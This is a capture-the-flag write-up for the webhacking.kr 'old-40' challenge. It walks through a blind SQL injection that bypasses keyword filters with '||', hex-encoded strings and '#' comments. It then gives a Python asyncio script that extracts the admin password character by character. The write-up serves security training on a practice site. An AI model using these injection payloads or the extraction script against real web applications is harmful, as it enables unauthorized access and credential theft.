# Old 40    SQLi (Blind)

URL: [https://webhacking.kr/challenge/web-29/](https://webhacking.kr/challenge/web-29/)

![old-40.png](/assets/ctf/webhacking.kr/old-40.png)

Upon submitting the request we can see params in URL: [https://webhacking.kr/challenge/web-29/?no=1&id=guest&pw=guest](https://webhacking.kr/challenge/web-29/?no=1&id=guest&pw=guest)

![old-40-1.png](/assets/ctf/webhacking.kr/old-40-1.png)

`no` with payload `1' OR 1=1 -- -` returns `access denied`, probably all 3 variables need to be satisfied for logon.

So `AND`, `OR`, `SELECT`, `--`, quotes are blocked and can't use them. We can use `||` OR operator and add another condition, luckily `#` comment works.

![old-40-2.png](/assets/ctf/webhacking.kr/old-40-2.png)

```sql
no=2||id=0x61646D696E%23
id=guest
pw=guest
```

[https://webhacking.kr/challenge/web-29/?no=2||id=0x61646D696E%23&id=admin&pw=admin](https://webhacking.kr/challenge/web-29/?no=2||id=0x61646D696E%23&id=admin&pw=admin)

![old-40-4.png](/assets/ctf/webhacking.kr/old-40-4.png)

```python
import asyncio
from aiohttp import ClientSession, TCPConnector
import string

URL = 'https://webhacking.kr/challenge/web-29/index.php'
CHARSET = string.ascii_letters + string.digits + '{}?!,_'
COOKIES = {'PHPSESSID': 'hi4uvai5sde90encr0ktq6879f'}
PAYLOAD = '2||id=0x61646D696E&&SUBSTR(pw,{},1)={}'
SUCCESS = 'admin password'


async def fetch(session, payload):
    async with session.get(URL, cookies=COOKIES, params={'no': payload, 'id': 'guest', 'pw': 'guest'}) as resp:
        text = await resp.text()
        if SUCCESS in text:
            return True

        return False


async def main():
    async with ClientSession() as session:
        password = 'luck_admin'
        while True:
            password_i = len(password) + 1
            print(password)
            tasks = [
                fetch(session, PAYLOAD.format(password_i, f'0x{format(ord(c), "0X")}')) 
                for c in CHARSET
            ]
            results = await asyncio.gather(*tasks)
            for i, result in enumerate(results):
                if result:
                    password += CHARSET[i]
                    break
            else:
                break

if __name__ == '__main__':
    asyncio.run(main())
```

![old-40-3.png](/assets/ctf/webhacking.kr/old-40-3.png)